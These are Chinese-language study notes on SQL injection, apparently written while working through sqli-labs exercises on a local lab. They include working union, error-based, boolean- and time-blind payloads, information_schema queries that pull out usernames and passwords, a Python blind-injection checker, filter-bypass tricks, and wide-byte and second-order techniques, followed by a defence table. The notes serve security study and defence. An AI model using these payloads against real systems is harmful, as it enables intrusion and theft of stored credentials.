# 04 · SQL 注入（task4）

# 一、原理

**根因：把用户输入直接拼进 SQL 语句**，数据库分不清"指令"和"数据"。

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id";   // 直接拼接
mysqli_query($conn, $sql);
```

```
正常：?id=1        → WHERE id=1
注入：?id=1 or 1=1 → WHERE id=1 or 1=1     （恒真，查出所有）
```

### 逃逸与闭合

| 闭合符 | 场景 |
|---|---|
| `'` | 单引号字符型（最常见） |
| `"` | 双引号字符型 |
| `)` | 括号内的值 |
| `')` / `")` / `'))` | 组合 |

### 注释符（屏蔽后面干扰）

| 注释 | 说明 |
|---|---|
| `-- ` | **后面必须有空格**，URL 里用 `--+` |
| `#` | MySQL 特有，**URL 要编码成 `%23`** |
| `/**/` | 内联注释，**常用来绕空格过滤**。它**只在「按 token 解析」的语言里能当空格**（SQL / PHP / JS 代码层），**字符串里和 shell 里都无效** → 跨语言对照表见 [12](./12-注释当空格与命令绕过.md) |

# 二、判断四步（**背**）

```
第1步：判类型（数字型 or 字符型）
  ?id=1 and 1=1  正常 / ?id=1 and 1=2  异常  →  数字型（不用闭合）
  两种都一样                                  →  字符型（要闭合引号）

第2步：找闭合符
  ?id=1'  看报错
    报错里 ''  →  '
    报错里 ')  →  ')
    报错里 ""  →  "

第3步：数显位（列数）
  ?id=1 order by 1 / 2 / 3 ...  加到报错 → 列数 = 报错前那个

第4步：定位回显位
  ?id=-1' union select 1,2,3 --+
  看页面上哪个数字显示了
```

**`-1` 的作用**：让原查询查空，这样 union 的结果才会显示。

# 三、分类

## 3.1 按回显方式（最常用）

| 类型 | 特征 | 核心 payload |
|---|---|---|
| **联合查询** | 有显示位 | `union select 1,2,3` |
| **报错注入** | 无数据显示，**有报错** | `updatexml(1,concat(0x7e,(select database())),1)` |
| **布尔盲注** | 只有"真/假" | `and ascii(substr(database(),1,1))>100` |
| **时间盲注** | 完全无差别 | `and if(1=1, sleep(5), 1)` |

## 3.2 按位置/编码

| 类型 | 说明 |
|---|---|
| **POST 注入** | 登录框，参数在 body |
| **Cookie 注入** | `Cookie: uname=admin'...` |
| **HTTP 头注入** | User-Agent / Referer 被拼进 SQL |
| **宽字节注入** | GBK 吃掉转义符 `\` → `%df'` |
| **二次注入** | 存时转义，取出用时不转义 |

# 四、information_schema（查数据三步）

| 表 | 字段 | 查什么 |
|---|---|---|
| **SCHEMATA** | `schema_name` | 库名 |
| **TABLES** | `table_name`, `table_schema` | 表名（需指定库） |
| **COLUMNS** | `column_name`, `table_name` | 列名（需指定表） |

## 联合注入完整流程

```sql
-- ① 查库名
union select 1,group_concat(schema_name),3 from information_schema.schemata

-- ② 查表名（已知库 security）
union select 1,group_concat(table_name),3 from information_schema.tables
  where table_schema='security'

-- ③ 查列名（已知表 users）
union select 1,group_concat(column_name),3 from information_schema.columns
  where table_name='users'

-- ④ 查数据
union select 1,group_concat(username,0x3a,password),3 from users
-- 0x3a = 冒号，用来分隔
```

**`group_concat` 要点**：
```sql
group_concat(table_name)                    -- 默认逗号分隔
group_concat(table_name separator '|')      -- 自定义分隔符
group_concat(a, 0x3a, b)                    -- 拼多字段
-- 默认限制 1024 字节，会截断！
SET SESSION group_concat_max_len = 100000;
```

# 五、报错注入

**原理**：`updatexml(文档, XPath, 新值)` —— 若 XPath **格式非法**，MySQL 报错并**把内容显示出来**。

```sql
-- 查库名
?id=1' and updatexml(1,concat(0x7e,(select database())),1)--+
-- 0x7e 是 ~，让 XPath 非法

-- 等价函数
?id=1' and extractvalue(1,concat(0x7e,(select database())))--+
```

**最多回显 32 字符**，超长要用 `substr()` 截断。

# 六、盲注

> 实战结论来源：sqli-labs **Less-15**（布尔盲注）、**Less-9**（时间盲注）、**Less-54**（跨库读 `challenges`），2026-10-07 本机实测。

## 6.1 先分清是布尔还是时间（**别选错**）

| | 布尔盲注 | 时间盲注 |
|---|---|---|
| 页面差异 | **有**（图片/文案/长度会变） | **没有** |
| 判据 | 响应体的一个特征 | **响应耗时** |
| 速度 | 快（不 sleep） | 慢（每次都要等） |
| Less-15 | 是 ← `images/flag.jpg` = 真，`images/slap.jpg` = 假 | 同接口也能做，但没必要 |
| Less-9 | 不是（两个分支回显**完全一样**的 `You are in...........`） | 是 |

**一句话判据**：条件写真、写假各发一次，**页面变了就是布尔，页面一模一样就是时间**。

## 6.2 布尔盲注五步模板

```sql
-- ① 定长度：页面变 "真" 的那个数
?id=1' and length(database())=8--+

-- ② 二分猜字符（比逐字符快，1 字符约 7 次请求）
?id=1' and ascii(substr(database(),1,1))>100--+

-- ③ 收敛到精确值
?id=1' and ascii(substr(database(),1,1))=115--+

-- ④ 换位置继续
?id=1' and ascii(substr(database(),2,1))>100--+
```

```python
def check(payload):
    r = requests.get(url + payload)
    return "images/flag.jpg" in r.text      # ← 只有这一个判据
```

**判据要选“不可能偶然出现”的特征**：Less-15 用 `images/flag.jpg` / `images/slap.jpg` 比用文案长度可靠。

## 6.3 时间盲注：延迟 = sleep(N) × 条件被求值的行数

**这是最容易算错的地方** —— 不是「sleep 几秒就卡几秒」，而是**每匹配一行就求值一次**。

| 写法（Less-9 实测，sleep(3)） | 延迟 | 为什么 |
|---|---|---|
| `id=1' and if(条件, sleep(3), 0)-- ` | **3.0s** | `and` 左边锚定 1 行 → 1 倍，**精确** |
| `id=-1' or if(条件, sleep(3), 0)-- ` | **≈40s** | `or` 右边每行都求值 → 13 行 × 3s |
| `id=1' or if(条件, sleep(3), 0)-- ` | **≈12×3s** | `or` 同上，按表行数放大 |

**结论**：

- **优先用 `and` + 锚定左值**（`id=1 and ...`）→ 延迟正好等于 `sleep(N)`，好判读
- `or` 会**按行数叠加**，慢但信号极强（想确认「真的注进去了」时很好用）
- `and` 左边不匹配任何行时**一次都不 sleep**（`username='1'` → 0.02s），会误判成假

**倍数标定实验**（Less-15，`users` 表 13 行）：

```
1' or if(条件, sleep(1), sleep(0)) #   →  约 12 秒   （倍数 ≈ 12）
1' or if(条件, sleep(3), sleep(0)) #   →  约 40 秒
1' or if(id=8 and 条件, sleep(3), 0) # →  约 3 秒    （锚定唯一行 → 倍数 = 1）
```

**注释符选 `#` 而不是 `-- `**：`--` 后面必须跟空格，`#` 直接吃到行尾，写起来不容易断。

## 6.4 `information_schema` 的层级与「按库收窄」

```
Server
 └─ Database        information_schema.schemata          .schema_name
     └─ Table       information_schema.tables            .table_name  （按 table_schema 收窄）
         └─ Column  information_schema.columns           .column_name （按 table_schema + table_name 收窄）
             └─ Row  实际表里的数据
```

**本机实测规模**：`information_schema.columns` 共 **3250 行**，横跨 **7 个库 / 304 张表**。
→ 查列名时**必须**同时限定 `table_schema` 和 `table_name`，否则 `group_concat` 直接被 `group_concat_max_len` 截断，拿到的是别的库的同名列。

```sql
-- 反例：没限定表 → 捞回一堆无关的 user / id 列
select group_concat(column_name) from information_schema.columns where table_name='users'

-- 正例：限定库 + 表
select group_concat(column_name) from information_schema.columns
  where table_schema=database() and table_name='users'
```

## 6.5 不带库名的表名，走的是「连接的默认库」

```sql
select * from users      -- 解析成 <默认库>.users（sqli-labs 里默认库 = security）
```

**跨库必须写全名**，表名是随机的时候还要反引号：

```sql
select `secret_9WEI` from `challenges`.`7j2ha5vhrn`
```

**Less-54 流程**（只有 10 次尝试，所以要「贪婪」：一次请求取尽可能多）：

```sql
-- ① 表名（用 # 吃掉原句的 LIMIT 0,1）
-1' union select (select group_concat(table_name) from information_schema.tables
                  where table_schema='challenges'),2 #
-- ② 列名
-1' union select (select group_concat(column_name) from information_schema.columns
                  where table_schema='challenges' and column_name like 'secret%'),2 #
-- ③ 读值
-1' union select (select `secret_9WEI` from `7j2ha5vhrn` limit 0,1),2 #
```

> 本题的挑战表名/列名是**每次 reset 随机**的，所以必须先查 `information_schema` 再读值 —— 顺序不能反。

## 6.6 其他判据

- **`is_numeric(intval($x))` 恒真**，别拿它当过滤
- **`count(username)=13`** 这类常数条件会被 MySQL 折叠，可能 0 秒返回 —— 要验证「条件被求值几次」就用带 `id=` 的锚定写法

# 七、绕过技巧

| 被过滤 | 绕过 |
|---|---|
| **空格** | `/**/`、`%09`、`%0a`、`()` |
| **注释符** | `#` ↔ `-- ` ↔ `/**/` |
| **`union`** | 大小写 `UNION`、**双写** `uniunionon`、`/*!union*/` |
| **`select`** | 双写 `selselectect` |
| **`and`/`or`** | `&&` / `\ | \ | `、`%26%26` |
| **`=`** | `like`、`in`、`between` |
| **逗号** | `join`、`limit 1 offset 0` |
| **`substr`** | `mid`、`substring`、`left`、`right` |
| **`ascii`** | `ord`、`hex` |
| **`information_schema`** | `mysql.innodb_table_stats`（5.7+） |

**双写原理**：
```
过滤代码：str_replace('union', '', $id)
输入：uniunionon
删除中间那个 union → 剩下 union
```

# 八、宽字节注入（GBK）

```php
$id = addslashes($_GET['id']);       // ' → \'   （0x27 → 0x5C 0x27）
// 数据库是 GBK 编码
```

**攻击**：输入 `%df'`
```
%df(0xDF) + \(0x5C)  →  GBK 认为是一个汉字  →  反斜杠被吃掉
剩下的 ' 逃逸出来
```

**payload**：`?id=-1%df' union select 1,2,3 --+`

# 九、二次注入

```
① 注册用户名 admin'#     → 后端转义成 admin\'# 存入（实际库里是 admin'#）
② 之后某功能从库里取出用户名再拼 SQL（此时不再转义）
③ 导致 '# 生效 → 注入
```

**特点**：注入发生在**第二次使用**时，光看插入处代码发现不了。

# 十、防御

| 方法 | 说明 |
|---|---|
| **预处理（参数化查询）** | **终极方案**，代码与数据分离 |
| 白名单 | 只允许数字/字母 |
| 转义特殊字符 | `'` `"` `\` `--` `#` |
| 最小权限 | 数据库账号不给 FILE/PROCESS |
| 关闭报错回显 | 防止报错注入 |
| 统一字符集 | 防宽字节 |

# 十一、一句话

> **SQL 注入 = 输入拼进 SQL**。**判断四步：`and 1=1/1=2` 判类型 → `'` 探闭合符 → `order by` 数显位 → `union select` 定位**。**分类：有显示位用联合、有报错用 updatexml、只有真假用布尔、全无差别用时间**。**查数据固定用 `information_schema`（SCHEMATA→TABLES→COLUMNS）**。
